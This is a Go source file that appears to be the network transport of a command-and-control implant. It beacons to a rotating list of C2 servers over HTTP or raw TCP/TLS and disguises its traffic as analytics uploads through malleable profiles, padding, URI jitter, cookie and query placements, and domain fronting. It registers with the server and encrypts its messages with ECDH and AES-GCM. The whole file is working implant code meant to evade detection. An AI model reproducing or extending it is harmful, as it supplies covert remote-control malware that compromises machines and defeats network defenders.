package main

import (
	"bytes"
	"crypto/hmac"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// c2URLsSnapshot returns a stable snapshot of the C2 URL list. The slice is
// never mutated after being published via c2URLsStore, so callers may iterate
// it without locking. Reading the old C2URLs slice directly (with a separate
// currentC2Idx) allowed an index-out-of-range panic when the list was replaced
// concurrently (e.g. on profile rotate) while another goroutine indexed it.
func c2URLsSnapshot() []string {
	if v := c2URLsAtomic.Load(); v != nil {
		return v.([]string)
	}
	return nil
}

// c2URLsStore publishes a new C2 URL list together with the index of the last
// working server, atomically, so readers can never observe a slice/idx mismatch.
func c2URLsStore(urls []string, idx int32) {
	if len(urls) == 0 {
		idx = 0
	} else if idx < 0 || idx >= int32(len(urls)) {
		idx = 0
	}
	c2URLsAtomic.Store(urls)
	currentC2Idx.Store(idx)
}

// c2URLAtIndex returns the C2 URL at i, clamped to the current list length so a
// stale index hint can never panic.
func c2URLAtIndex(i int) string {
	urls := c2URLsSnapshot()
	if len(urls) == 0 {
		return ""
	}
	if i < 0 || i >= len(urls) {
		i = 0
	}
	return urls[i]
}

func sendToC2(idx int, body []byte) []byte {
	urls := c2URLsSnapshot()
	if idx < 0 || idx >= len(urls) {
		return nil
	}
	url := urls[idx]

	beaconURI := beaconHTTPURI()

	method := getActiveBeaconMethodFromConfig()
	if method == "" {
		method = "POST"
	}
	// Apply request-side malleable transforms to the outbound body so the
	// server can strip them on inbound; the enclosed envelope is unchanged.
	body = padBeaconBody(body)
	body = wrapMalleableRequest(body)
	req, err := http.NewRequest(method, url+beaconURI, bytes.NewReader(body))
	if err != nil {
		return nil
	}
	// Analytics-mimic baseline in fixed canonical order so every beacon
	// emits the identical sequence (map iteration order would be a
	// per-beacon fingerprint): opaque bytes as text/plain POSTed to /collect,
	// like an analytics telemetry upload. Profile headers below apply in
	// sorted-key order and may override any baseline, including Content-Type/UA.
	req.Header.Set("Content-Type", "text/plain;charset=UTF-8")
	req.Header.Set("User-Agent", getActiveUserAgentFromConfig())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	if activeHeaders := getActiveHeaders(); len(activeHeaders) > 0 {
		for _, k := range sortedHeaderKeys(activeHeaders) {
			req.Header.Set(k, activeHeaders[k])
		}
	}
	// Request-side malleable headers (e.g. Host/Cookie shaping). These are
	// benign to the server's JSON parsing; they simply ride along on the request.
	for _, k := range sortedHeaderKeys(MalleableRequestHeaders) {
		req.Header.Set(k, MalleableRequestHeaders[k])
	}
	// v2 placements: encoded cover copies of the envelope at query / cookie /
	// header locations. The canonical body is unchanged, so servers without
	// placement config keep working.
	if MalleablePlacementStr != "" {
		if q, cookies, ph := buildPlacementValues(body); q != nil || cookies != nil || ph != nil {
			if len(q) > 0 {
				u := req.URL.Query()
				for k, v := range q {
					u.Set(k, v)
				}
				req.URL.RawQuery = u.Encode()
			}
			if len(cookies) > 0 {
				var sb strings.Builder
				if prev := req.Header.Get("Cookie"); prev != "" {
					sb.WriteString(prev)
					if !strings.HasSuffix(prev, ";") {
						sb.WriteString("; ")
					}
				}
				i := 0
				for k, v := range cookies {
					if i > 0 {
						sb.WriteString("; ")
					}
					sb.WriteString(placementEscape(k))
					sb.WriteString("=")
					sb.WriteString(placementEscape(v))
					i++
				}
				req.Header.Set("Cookie", sb.String())
			}
			for k, v := range ph {
				if strings.EqualFold(k, "Content-Type") || strings.EqualFold(k, "User-Agent") {
					continue
				}
				req.Header.Set(k, v)
			}
		}
	}
	// URI jitter: junk query per beacon so identical envelopes still vary on
	// the wire. Independent of placements; the server ignores unknown params.
	if JitterURIStr == "true" {
		u := req.URL.Query()
		k, v := jitterQueryPair()
		u.Set(k, v)
		req.URL.RawQuery = u.Encode()
	}

	if DomainFront != "" {
		req.Host = DomainFront
	}

	resp, err := client.Do(req)
	if err != nil {
		if Debug {
			fmt.Printf("[!] Beacon to %s failed: %v\n", url, err)
		}
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		if Debug {
			fmt.Printf("[!] %s returned %d\n", url, resp.StatusCode)
		}
		// Teamserver restart drops the in-memory ECDH session; the next loop
		// must handshake instead of forever replaying ciphertext into 400s.
		if ecdhSess != nil {
			ecdhSess.invalidate()
		}
		inFastMode.Store(true)
		return nil
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}
	if Debug {
		fmt.Printf("[+] Beacon OK from %s, response %d bytes\n", url, len(data))
	}
	// The server's malleable profile may wrap the JSON reply with fixed
	// prepend/append bytes. Strip them here (HTTP transport only) so the
	// JSON envelope below parses; binary transports never wrap the frame.
	data = stripMalleableWrapping(data)
	// Reverse the server's profile output transforms (e.g. base64+xor) so the
	// encrypted envelope can be recovered; without this the preset C2 pipeline
	// is dead for the live agent. Decode order is the reverse of the server's
	// apply order, which agentApplyTransforms handles when encode=false.
	if len(malleableRespDecodeSteps) > 0 {
		if dec, err := agentApplyTransforms(data, malleableRespDecodeSteps, false); err == nil {
			data = dec
		} else {
			if Debug {
				fmt.Printf("[!] malleable response decode failed: %v\n", err)
			}
			// Treat as transport failure so backoff/failover logic kicks in.
			return nil
		}
	}
	return data
}

// stripMalleableWrapping removes the configured malleable prepend/append
// padding from an HTTP beacon response body. The server prepends/appends the
// exact strings configured in its malleable profile; stripping must be
// symmetrical or the JSON decoder rejects the reply.
func stripMalleableWrapping(data []byte) []byte {
	switch {
	case MalleablePrepend == "" && MalleableAppend == "":
		return data
	case MalleablePrepend == "":
		return bytes.TrimSuffix(data, []byte(MalleableAppend))
	case MalleableAppend == "":
		return bytes.TrimPrefix(data, []byte(MalleablePrepend))
	default:
		data = bytes.TrimPrefix(data, []byte(MalleablePrepend))
		return bytes.TrimSuffix(data, []byte(MalleableAppend))
	}
}

// wrapMalleableResponse applies the response-side malleable prepend/append so a
// raw (non-HTTP) link — a team-server TCP listener or a P2P parent→child reply
// — carries the same cover as the HTTP transport. It is the inverse of
// stripMalleableWrapping and a no-op when nothing is configured, keeping the
// framing backward-compatible for links that do not use a profile.
func wrapMalleableResponse(body []byte) []byte {
	switch {
	case MalleablePrepend == "" && MalleableAppend == "":
		return body
	case MalleablePrepend == "":
		return append(body, []byte(MalleableAppend)...)
	case MalleableAppend == "":
		return append([]byte(MalleablePrepend), body...)
	default:
		out := append([]byte(MalleablePrepend), body...)
		return append(out, []byte(MalleableAppend)...)
	}
}

// wrapMalleableRequest applies the request-side malleable transforms
// (prepend/append) to the agent's OUTGOING beacon body. The server strips this
// wrapping on inbound (stripMalleableRequest), so the JSON envelope it encloses
// is delivered unchanged. Binary/length-prefixed transports do not call this.
func wrapMalleableRequest(body []byte) []byte {
	switch {
	case MalleableRequestPrepend == "" && MalleableRequestAppend == "":
		return body
	case MalleableRequestPrepend == "":
		return append(body, []byte(MalleableRequestAppend)...)
	case MalleableRequestAppend == "":
		return append([]byte(MalleableRequestPrepend), body...)
	default:
		out := append([]byte(MalleableRequestPrepend), body...)
		return append(out, []byte(MalleableRequestAppend)...)
	}
}

func sendBeacon(body []byte) []byte {
	startIdx := int(currentC2Idx.Load())
	urls := c2URLsSnapshot()
	for i := 0; i < len(urls); i++ {
		idx := (startIdx + i) % len(urls)
		data := sendToC2(idx, body)
		if data != nil {
			currentC2Idx.Store(int32(idx))
			return data
		}
	}
	return nil
}

// sendTCPBeacon implements the TCP transport using length-prefixed JSON framing.
// The C2 URL may be tcp://host:port, tls://host:port, or an http(s) URL whose
// host:port is reused after transport failover — never dial the raw URL.
func sendTCPBeacon(body []byte) []byte {
	addr, scheme, ok := currentC2Dial()
	if !ok {
		if Debug {
			fmt.Printf("[!] TCP beacon: cannot parse C2 address from %q\n", currentC2Raw())
		}
		return nil
	}

	var conn net.Conn
	var err error

	useTLS := c2UseTLS(scheme)
	if useTLS {
		conn, err = dialUTLSTCP("tcp", addr)
	} else {
		conn, err = net.DialTimeout("tcp", addr, 10*time.Second)
	}
	if err != nil {
		if Debug {
			fmt.Printf("[!] TCP beacon dial failed: %v\n", err)
		}
		return nil
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// Write length (BE) + body
	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	// Read response length
	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}

	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	// Mirror the HTTP transport: strip any malleable prepend/append cover the
	// server wrapped around the raw frame so the enclosed envelope parses.
	return stripMalleableWrapping(rbuf)
}

// tryResync applies a server resync signal: a plaintext, MAC-signed envelope
// carrying the server's current last_seq. If the MAC verifies and the server is
// ahead, the local counter is fast-forwarded so subsequent beacons are accepted
// instead of being permanently rejected as replays.
func tryResync(body []byte) {
	var r struct {
		Seq     uint64 `json:"seq"`
		ECDHPub string `json:"ecdh_pub"`
		Mac     string `json:"mac"`
		LastSeq uint64 `json:"last_seq"`
	}
	if err := json.Unmarshal(body, &r); err != nil {
		return
	}
	if r.ECDHPub == "" || r.Mac == "" {
		return
	}
	if !verifyResponseMAC(r.Seq, r.ECDHPub, r.Mac) {
		if Debug {
			log.Printf("[!] resync response MAC mismatch, ignoring")
		}
		return
	}
	seqMu.Lock()
	next := r.LastSeq + 1
	changed := r.LastSeq > 0 && beaconSeq != next
	if changed {
		beaconSeq = next
	}
	seqMu.Unlock()
	if changed {
		persistBeaconState()
		inFastMode.Store(true)
		if Debug {
			log.Printf("[*] resynced sequence to %d (server last_seq=%d)", beaconSeq, r.LastSeq)
		}
	}
}

// verifyResponseMAC checks the server's authentication response MAC:
// HMAC(regKey, agentUUID || seq || server_pub). Guards against MITM public-key
// substitution. A missing/invalid registration key fails closed.
func verifyResponseMAC(seq uint64, serverPubB64, macB64 string) bool {
	if agentRegKey == nil || macB64 == "" || serverPubB64 == "" {
		return false
	}
	expected := computeFrameMAC(agentRegKey, agentUUID, strconv.FormatUint(seq, 10), serverPubB64)
	got, err := base64.StdEncoding.DecodeString(macB64)
	if err != nil {
		return false
	}
	return hmac.Equal(expected, got)
}

// buildBeaconEnvelope wraps a plaintext beacon request in the v2 transport
// envelope: registration (first run), authenticated handshake (session
// missing/rekey), or AES-256-GCM ciphertext bound to (uuid, seq). Encryption
// is mandatory — there is no plaintext or legacy XOR fallback.
// Returns the bytes to transmit, the frame kind, the frame sequence and
// ok=false when the payload MUST NOT be sent.
func buildBeaconEnvelope(body []byte) (sendBody []byte, kind agentFrameKind, seq uint64, ok bool) {
	if ecdhSess == nil || identityPriv == nil {
		return nil, 0, 0, false
	}
	seq = nextBeaconSeq()
	ts := time.Now().Unix()
	env := v2Envelope{UUID: agentUUID, Seq: seq, Ts: ts}

	seqMu.Lock()
	reg := registered
	rekey := rekeyRequested
	seqMu.Unlock()

	switch {
	case !reg:
		// One-time registration binds the identity key.
		kind = agentFrameRegister
		idPub := identityPubB64()
		if idPub == "" || agentRegKey == nil {
			return nil, 0, 0, false
		}
		env.ECDHPub = idPub
		env.IdentityPub = idPub
		env.SecretID = RegSecretIDStr
		env.RegHMAC = base64.StdEncoding.EncodeToString(computeRegHMAC(agentRegKey, agentUUID, idPub, ts, seq))
	case ecdhSess.needsHandshake() || rekey:
		// Authenticated handshake with a fresh ephemeral key.
		kind = agentFrameHandshake
		env.ECDHPub = ecdhSess.publicKeyB64()
		if agentRegKey == nil {
			return nil, 0, 0, false
		}
		// v3: carry the per-implant secret id so the server can authenticate the
		// handshake against the secret store even if the implant row was deleted
		// server-side. This is what lets a v3 agent recover after row deletion.
		env.SecretID = RegSecretIDStr
		env.Mac = base64.StdEncoding.EncodeToString(computeFrameMAC(agentRegKey, agentUUID, env.ECDHPub, strconv.FormatInt(ts, 10), strconv.FormatUint(seq, 10)))
	default:
		kind = agentFrameEncrypted
		aad := []byte(agentUUID + "\x00" + strconv.FormatUint(seq, 10))
		cipherB64, err := ecdhSess.encryptAESGCMWithAAD(body, aad)
		if err != nil {
			return nil, 0, 0, false
		}
		env.CipherB64 = cipherB64
	}

	// Persist the sequence before sending so it can never go backwards.
	persistBeaconState()

	envelopeJSON, err := json.Marshal(env)
	if err != nil {
		return nil, 0, 0, false
	}
	return envelopeJSON, kind, seq, true
}
